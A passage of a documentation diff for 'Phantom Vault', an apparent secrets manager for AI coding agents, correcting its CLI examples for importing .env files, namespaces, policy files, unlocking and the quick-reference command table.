 | `allowed` namespaces | Which namespaces can be created and accessed | (list) |
-| `sensitivity.high` | Secrets that require human confirmation for AI access | (list) |
 | `warn_at_days` | Days before health check warns about secret age | 60 |
 | `critical_at_days` | Days before critical warning about secret age | 90 |
 | `auto_create` canaries | Automatically plant canary secrets in new namespaces | true |
-| `webhook_url` | URL to send canary trigger alerts | (empty) |
 | `default_timeout_seconds` | Max time for vault_run commands | 30 |
 | `network_filtering` | Enable per-process network sandbox | true |
 
@@ -1480,7 +1106,7 @@ If you currently have secrets in `.env` files (most developers do), here's how t
 ### Import All Keys from a .env File
 
 ```
-ryan@macbook ~ % phantom import --file .env
+ryan@macbook ~ % phantom import .env
 
   Reading .env file...
 
@@ -1506,20 +1132,13 @@ ryan@macbook ~ % phantom import --file .env
     echo '.env' >> .gitignore
 ```
 
-### Import into a Specific Namespace
+`phantom import` takes a single argument — the path to the `.env` file (`phantom import <PATH>`). It has no `--namespace` or `--tags` flag; secrets import into your current default namespace. Switch namespaces first with `phantom namespace use <name>` if you want them to land elsewhere:
 
 ```
-ryan@macbook ~ % phantom import --file .env --namespace ib365
+ryan@macbook ~ % phantom namespace use ib365
+ryan@macbook ~ % phantom import .env.production
 
   ✓ Imported 8 secrets into namespace 'ib365'
-```
-
-### Import with Tags
-
-```
-ryan@macbook ~ % phantom import --file .env.production --namespace ib365 --tags prod
-
-  ✓ Imported 8 secrets into namespace 'ib365' with tag 'prod'
 ```
 
 ---
@@ -1544,10 +1163,10 @@ ryan@macbook ~ % phantom namespace create ib365
 ryan@macbook ~ % phantom namespace create advancedpsych
 
 # 4. Add their secrets (provided by team lead securely)
-ryan@macbook ~ % phantom add STRIPE_SECRET_KEY --namespace ib365 --sensitivity high
-ryan@macbook ~ % phantom add DATABASE_URL --namespace ib365 --sensitivity high
-ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --sensitivity high
-ryan@macbook ~ % phantom add RAILWAY_TOKEN --namespace ib365 --sensitivity medium
+ryan@macbook ~ % phantom add STRIPE_SECRET_KEY --namespace ib365
+ryan@macbook ~ % phantom add DATABASE_URL --namespace ib365
+ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365
+ryan@macbook ~ % phantom add RAILWAY_TOKEN --namespace ib365
 
 # 5. Connect to Claude Code
 ryan@macbook ~ % phantom mcp install
@@ -1584,16 +1203,17 @@ System Preferences → Privacy & Security → Touch ID & Passwords → Terminal 
 ### vault_run Returns BLOCKED for a Legitimate Command
 
 ```
-ryan@macbook ~ % phantom run --keys KEY --dry-run -- your-command-here
+ryan@macbook ~ % phantom run -s KEY -- your-command-here
 
-  Analysis result: ✗ BLOCKED
+  ✗ BLOCKED
   Reason: ...
 ```
 
-**Fix:** If it's a false positive, add the command pattern to your allowed list:
+**Fix:** If it's a false positive, adjust your policy. Write your rules to a policy file and apply it, or view/reset the current policy:
 
 ```
-ryan@macbook ~ % phantom policy allow-domain needed-domain.com
+ryan@macbook ~ % phantom policy show
+ryan@macbook ~ % phantom policy set my-policy.toml
 ```
 
 ### MCP Server Not Connecting
@@ -1628,15 +1248,15 @@ max_runs_per_minute = 20
 
 ```
   ✗ Vault is locked (idle timeout)
-  Unlock with: phantom unlock
 ```
 
-**Fix:**
+**Fix:** There is no separate unlock command. Just run any command that needs the vault (for example `phantom list`) and authenticate when prompted — Touch ID if biometric is enrolled, otherwise your master password:
 
 ```
-ryan@macbook ~ % phantom unlock
+ryan@macbook ~ % phantom list
 [Touch ID prompt]
 ✓ Vault unlocked
+  ... secrets listed ...
 ```
 
 ---
@@ -1645,52 +1265,61 @@ ryan@macbook ~ % phantom unlock
 
 ```
 ┌──────────────────────────────────────────────────────────────────────────────┐
-│  PHANTOM VAULT — QUICK REFERENCE                                            │
+│  PHANTOM VAULT — QUICK REFERENCE                                             │
 ├──────────────────────────────────────────────────────────────────────────────┤
 │                                                                              │
 │  SETUP                                                                       │
 │  phantom init                          Create your vault                     │
+│  phantom init --biometric              Create vault + enable Touch ID        │
 │  phantom mcp install                   Connect to Claude Code                │
 │                                                                              │
 │  SECRETS                                                                     │
-│  phantom add KEY_NAME                  Store a new secret                    │
+│  phantom add KEY_NAME                  Store a new secret (interactive)       │
+│  phantom add KEY --from-env VAR        Store from an environment variable     │
 │  phantom list                          List all secrets (names only)         │
-│  phantom show KEY_NAME                 Show details + last 4 chars           │
-│  phantom get KEY_NAME                  Get full value (human only)           │
+│  phantom show KEY_NAME --masked        Show last 4 chars                      │
+│  phantom get KEY_NAME                  Get full value (human/TTY only)        │
 │  phantom remove KEY_NAME               Delete a secret                       │
-│  phantom import --file .env            Import from .env file                 │
+│  phantom rotate KEY_NAME               Rotate a secret (new value)           │
+│  phantom import PATH                    Import from a .env file               │
+│  phantom edit                          Bulk-edit vault in $EDITOR (TTY only)  │
 │                                                                              │
 │  RUNNING COMMANDS                                                            │
-│  phantom run --keys K -- cmd           Run command with secret injected      │
-│  phantom run --dry-run --keys K -- cmd Check if command would be allowed     │
+│  phantom run -s KEY -- cmd             Run command with secret injected      │
+│  phantom run -s KEY=VAR -- cmd         Inject under a different var name      │
 │                                                                              │
 │  NAMESPACES                                                                  │
 │  phantom namespace create NAME         Create a namespace                    │
 │  phantom namespace list                List all namespaces                   │
-│  phantom namespace switch NAME         Change default namespace              │
+│  phantom namespace use NAME            Change default namespace              │
 │  phantom namespace delete NAME         Delete a namespace                    │
+│                                                                              │
+│  BIOMETRIC (macOS)                                                           │
+│  phantom biometric status              Check Touch ID status                 │
+│  phantom biometric enable              Enable Touch ID unlock                │
+│  phantom biometric disable             Disable Touch ID unlock               │
 │                                                                              │
 │  HEALTH & ROTATION                                                           │
 │  phantom health                        Check vault and secret health         │
-│  phantom rotate KEY_NAME               Rotate a secret                       │
-│                                                                              │
-│  AUDIT                                                                       │
-│  phantom audit tail                    View recent activity                  │
-│  phantom audit verify                  Check log integrity                   │
-│  phantom audit search --key KEY        Find entries for a secret             │
-│  phantom audit export --format json    Export log                            │
+│  phantom audit --last N                View last N audit entries             │
 │                                                                              │
 │  CANARIES                                                                    │
-│  phantom canary create                 Plant a honeypot secret               │
+│  phantom canary create NAME            Plant a honeypot secret               │
 │  phantom canary list                   List canary secrets                   │
-│  phantom canary status                 Check for triggered canaries          │
-│  phantom canary set-webhook URL        Set alert destination                 │
+│  phantom canary delete NAME            Delete a canary                       │
 │                                                                              │
 │  POLICY                                                                      │
 │  phantom policy show                   View current rules                    │
-│  phantom policy allow-domain DOMAIN    Allow a network domain                │
-│  phantom policy verify                 Check policy integrity                │
+│  phantom policy set FILE               Apply a policy file                   │
 │  phantom policy reset                  Reset to secure defaults              │
+│                                                                              │
+│  GUARDRAILS                                                                  │
+│  phantom guardrail set NAME --cap 50 --provider openai   Cap monthly spend   │
+│  phantom guardrail status              Usage vs cap for every guardrail      │
+│                                                                              │
+│  MAINTENANCE                                                                 │
+│  phantom passwd                        Change master password (re-encrypts)  │
+│  phantom update                        Update to the latest version         │
 │                                                                              │
 │  HELP                                                                        │
 │  phantom --help                        Full command listing                  │
@@ -1717,8 +1346,6 @@ When Claude Code connects to Phantom Vault, it gets access to exactly 6 tools. H
     "namespace": "default",
     "created": "2026-02-27",
     "expires": null,
-    "sensitivity": "medium",
-    "tags": ["payments"],
     "access_count": 3
   }
 ]
